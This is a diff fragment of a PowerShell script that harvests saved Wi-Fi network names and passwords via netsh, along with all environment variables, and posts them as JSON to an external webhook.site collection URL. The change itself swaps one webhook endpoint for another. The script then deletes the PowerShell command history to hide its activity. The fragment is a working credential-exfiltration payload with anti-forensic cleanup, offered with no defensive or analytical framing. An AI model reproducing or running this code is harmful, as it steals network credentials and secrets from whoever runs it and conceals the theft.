@@ -6,7 +6,7 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
     'wifi'= $wlan + " : " + $pass
     'env' = (gci env:*).GetEnumerator() | Out-String
   }
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
+  Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/abd9d9ea-249b-4068-881b-1e4b83564fba -Method Post -Body ($Body | ConvertTo-Json)
 }
 Remove-Item (Get-PSReadlineOption).HistorySavePath
 exit
